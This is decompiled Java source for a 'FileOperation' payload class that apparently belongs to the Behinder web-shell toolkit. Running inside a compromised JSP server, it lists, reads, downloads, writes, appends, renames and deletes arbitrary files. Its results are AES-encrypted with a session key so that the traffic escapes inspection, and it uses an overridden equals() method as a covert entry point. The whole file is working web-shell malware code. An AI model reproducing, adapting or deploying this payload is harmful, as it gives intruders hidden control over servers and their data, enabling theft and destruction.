// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Iterator;
import java.util.Arrays;
import java.io.FileOutputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.FileInputStream;
import java.util.List;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.io.File;
import javax.servlet.ServletOutputStream;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import java.nio.charset.Charset;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class FileOperation
{
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    private Charset osCharset;
    
    public FileOperation() {
        this.osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
    }
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<String, String>();
        //兼容zcms
        if(Session.getAttribute("payload")!=null){
            Session.removeAttribute("payload");
        }
        try {
            if (FileOperation.mode.equalsIgnoreCase("list")) {
                result.put("msg", this.list(page));
                result.put("status", "success");
            }
            else if (FileOperation.mode.equalsIgnoreCase("show")) {
                result.put("msg", this.show(page));
                result.put("status", "success");
            }
            else if (FileOperation.mode.equalsIgnoreCase("delete")) {
                result = this.delete(page);
            }
            else if (FileOperation.mode.equalsIgnoreCase("create")) {
                result.put("msg", this.create(page));
                result.put("status", "success");
            }
            else if (FileOperation.mode.equalsIgnoreCase("append")) {
                result.put("msg", this.append(page));
                result.put("status", "success");
            }
            else {
                if (FileOperation.mode.equalsIgnoreCase("download")) {
                    this.download(page);
                    return true;
                }
                if (FileOperation.mode.equalsIgnoreCase("rename")) {
                    result = this.renameFile(page);
                }
                else if (FileOperation.mode.equalsIgnoreCase("createFile")) {
                    result.put("msg", this.createFile(page));
                    result.put("status", "success");
                }
                else if (FileOperation.mode.equalsIgnoreCase("createDirectory")) {
                    result.put("msg", this.createDirectory(page));
                    result.put("status", "success");
                }
            }
        }
        catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }
        try {
            final ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
    
    private String list(final PageContext page) throws Exception {
        String result = "";
        final File f = new File(FileOperation.path);
        final List<Map<String, String>> objArr = new ArrayList<Map<String, String>>();
        if (f.isDirectory()) {
            for (final File temp : f.listFiles()) {
                final Map<String, String> obj = new HashMap<String, String>();
                obj.put("type", temp.isDirectory() ? "directory" : "file");
                obj.put("name", temp.getName());
                obj.put("size", temp.length() + "");
                obj.put("perm", temp.canRead() + "," + temp.canWrite() + "," + temp.canExecute());
                obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(temp.lastModified())));
                objArr.add(obj);
            }
        }
        else {
            final Map<String, String> obj2 = new HashMap<String, String>();
            obj2.put("type", f.isDirectory() ? "directory" : "file");
            obj2.put("name", new String(f.getName().getBytes(this.osCharset), "GBK"));
            obj2.put("size", f.length() + "");
            obj2.put("lastModified", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(f.lastModified())));
            objArr.add(obj2);
        }
        result = this.buildJsonArray(objArr, true);
        return result;
    }
    
    private String show(final PageContext page) throws Exception {
        if (FileOperation.charset == null) {
            FileOperation.charset = System.getProperty("file.encoding");
        }
        final StringBuffer sb = new StringBuffer();
        final File f = new File(FileOperation.path);
        if (f.exists() && f.isFile()) {
            final InputStreamReader isr = new InputStreamReader(new FileInputStream(f), FileOperation.charset);
            final BufferedReader br = new BufferedReader(isr);
            String str = null;
            while ((str = br.readLine()) != null) {
                sb.append(str + "\n");
            }
            br.close();
            isr.close();
        }
        return sb.toString();
    }
    
    private String create(final PageContext page) throws Exception {
        String result = "";
        final FileOutputStream fso = new FileOutputStream(FileOperation.path);
        fso.write(this.base64decode(FileOperation.content));
        fso.flush();
        fso.close();
        result = FileOperation.path + "\u4e0a\u4f20\u5b8c\u6210\uff0c\u8fdc\u7a0b\u6587\u4ef6\u5927\u5c0f:" + new File(FileOperation.path).length();
        return result;
    }
    
    private Map<String, String> renameFile(final PageContext page) throws Exception {
        final Map<String, String> result = new HashMap<String, String>();
        final File oldFile = new File(FileOperation.path);
        final File newFile = new File(FileOperation.newPath);
        if (oldFile.exists() && (oldFile.isFile() & oldFile.renameTo(newFile))) {
            result.put("status", "success");
            result.put("msg", "\u91cd\u547d\u540d\u5b8c\u6210:" + FileOperation.newPath);
        }
        else {
            result.put("status", "fail");
            result.put("msg", "\u91cd\u547d\u540d\u5931\u8d25:" + FileOperation.newPath);
        }
        return result;
    }
    
    private String createFile(final PageContext page) throws Exception {
        String result = "";
        final FileOutputStream fso = new FileOutputStream(FileOperation.path);
        fso.close();
        result = FileOperation.path + "\u521b\u5efa\u5b8c\u6210";
        return result;
    }
    
    private String createDirectory(final PageContext page) throws Exception {
        String result = "";
        final File dir = new File(FileOperation.path);
        dir.mkdirs();
        result = FileOperation.path + "\u521b\u5efa\u5b8c\u6210";
        return result;
    }
    
    private void download(final PageContext page) throws Exception {
        final FileInputStream fis = new FileInputStream(FileOperation.path);
        final byte[] buffer = new byte[1024000];
        int length = 0;
        final ServletOutputStream sos = page.getResponse().getOutputStream();
        while ((length = fis.read(buffer)) > 0) {
            sos.write(Arrays.copyOfRange(buffer, 0, length));
        }
        sos.flush();
        sos.close();
        fis.close();
    }
    
    private String append(final PageContext page) throws Exception {
        String result = "";
        final FileOutputStream fso = new FileOutputStream(FileOperation.path, true);
        fso.write(this.base64decode(FileOperation.content));
        fso.flush();
        fso.close();
        result = FileOperation.path + "\u8ffd\u52a0\u5b8c\u6210\uff0c\u8fdc\u7a0b\u6587\u4ef6\u5927\u5c0f:" + new File(FileOperation.path).length();
        return result;
    }
    
    private Map<String, String> delete(final PageContext page) throws Exception {
        final Map<String, String> result = new HashMap<String, String>();
        final File f = new File(FileOperation.path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", FileOperation.path + " \u5220\u9664\u6210\u529f.");
            }
            else {
                result.put("status", "fail");
                result.put("msg", "\u6587\u4ef6" + FileOperation.path + "\u5b58\u5728\uff0c\u4f46\u662f\u5220\u9664\u5931\u8d25.");
            }
        }
        else {
            result.put("status", "fail");
            result.put("msg", "\u6587\u4ef6\u4e0d\u5b58\u5728.");
        }
        return result;
    }
    
    private String buildJsonArray(final List<Map<String, String>> list, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (final Map<String, String> entity : list) {
            sb.append(this.buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final Object custmKeyObj = this.Request.getAttribute("parameters");
        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private byte[] base64decode(final String base64Text) throws Exception {
        final String version = System.getProperty("java.version");
        byte[] result;
        if (version.compareTo("1.9") >= 0) {
            this.getClass();
            final Class Base64 = Class.forName("java.util.Base64");
            final Object Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        else {
            this.getClass();
            final Class Base64 = Class.forName("sun.misc.BASE64Decoder");
            final Object Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
        }
        return result;
    }
}
